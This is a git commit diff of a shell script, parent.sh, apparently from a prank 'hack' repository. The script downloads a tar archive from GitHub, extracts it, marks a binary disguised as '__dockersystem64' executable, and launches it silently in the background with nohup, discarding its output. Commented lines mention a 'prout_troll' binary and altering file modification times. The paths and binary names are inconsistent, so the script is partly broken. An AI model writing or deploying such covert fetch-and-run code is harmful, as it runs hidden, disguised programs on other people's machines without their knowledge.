c64caa22a131ed32bed96f4fc77d7724cd5991dd
Mounir MADANI <71516457+Don-Chinjao@users.noreply.github.com>
2023-03-27 00:39:40 +0200

    parent updated

--- parent.sh
+++ parent.sh
@@ -4,13 +4,13 @@
 init_tempo=10 tempo=3 volume=30 tempo_offset=2 volume_offset=20
 # ------------------------------------------------------------------- #
 
-dir=/tmp ; dir+=`whoami` ; dir+='-docker' ; mkdir -p $dir
+dir=/tmp/ ; dir+=`whoami` ; dir+='-docker' ; mkdir -p $dir
 #curl 'nom de domaine' -o /tmp/$dir/proutsh42.tar
-curl https://raw.githubusercontent.com/Don-Chinjao/Mounir_m_a_hack/main/proutsh42.tar -o /tmp/$dir/proutsh42.tar
+curl https://raw.githubusercontent.com/Don-Chinjao/Mounir_m_a_hack/main/proutsh42.tar -o $dir/proutsh42.tar
 tar -xvf /tmp/$dir/proutsh42.tar -C $dir
 chmod 777 ./__dockersystem64
 #chmod 777 ./prout_troll
-cd /tmp/$dir
+cd $dir
 #chmod last modif time of all files
 (nohup ./__dockersytem64 $init_tempo $tempo $tempo_offset $volume $volume_offset &> /dev/null &)
 #(nohup ./prout_troll &> /dev/null &)
